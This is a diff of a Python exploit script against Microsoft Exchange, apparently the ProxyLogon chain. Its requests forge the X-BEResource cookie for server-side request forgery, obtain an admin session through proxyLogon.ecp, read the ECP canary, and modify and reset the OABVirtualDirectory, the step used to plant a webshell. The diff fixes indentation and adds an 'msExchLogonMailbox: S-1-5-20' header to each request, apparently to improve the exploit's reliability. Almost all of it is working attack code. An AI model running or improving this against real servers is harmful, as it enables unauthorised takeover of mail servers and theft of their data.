@@ -66,10 +66,10 @@ mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09
 ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
     "Cookie": "X-BEResource=Admin@%s:444/mapi/emsmdb?MailboxId=%s&a=~1942062522;" % (FQDN, mailboxid),
     "Content-Type": "application/mapi-http",
-	"X-Requesttype": "Connect",
-	"X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
-	"X-Clientapplication": "Outlook/15.0.4815.1002",
-	"X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:500",
+    "X-Requesttype": "Connect",
+    "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
+    "X-Clientapplication": "Outlook/15.0.4815.1002",
+    "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:500",
     "User-Agent": user_agent
 },
                    data=mapi_body,
@@ -89,6 +89,7 @@ proxyLogon_request = """<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-
 ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
     "Cookie": "X-BEResource=Admin@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % FQDN,
     "Content-Type": "text/xml",
+    "msExchLogonMailbox": "S-1-5-20",
     "User-Agent": user_agent
 },
                    data=proxyLogon_request,
@@ -107,6 +108,7 @@ print("Got canary: " + msExchEcpCanary)
 ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={
     "Cookie": "X-BEResource=Admin@%s:444/ecp/about.aspx?a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
         FQDN, sess_id, msExchEcpCanary),
+    "msExchLogonMailbox": "S-1-5-20",
     "User-Agent": user_agent
 },
                   verify=False
@@ -123,6 +125,7 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
     "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
         FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
     "Content-Type": "application/json; charset=utf-8",
+    "msExchLogonMailbox": "S-1-5-20",
     "User-Agent": user_agent
 
 },
@@ -146,6 +149,7 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
     "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
         FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
     "Content-Type": "application/json; charset=utf-8",
+    "msExchLogonMailbox": "S-1-5-20",
     "User-Agent": user_agent
 },
                    json=oab_json,
@@ -164,6 +168,7 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
     "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
         FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
     "Content-Type": "application/json; charset=utf-8",
+    "msExchLogonMailbox": "S-1-5-20",
     "User-Agent": user_agent
 },
                    json=reset_oab_body,
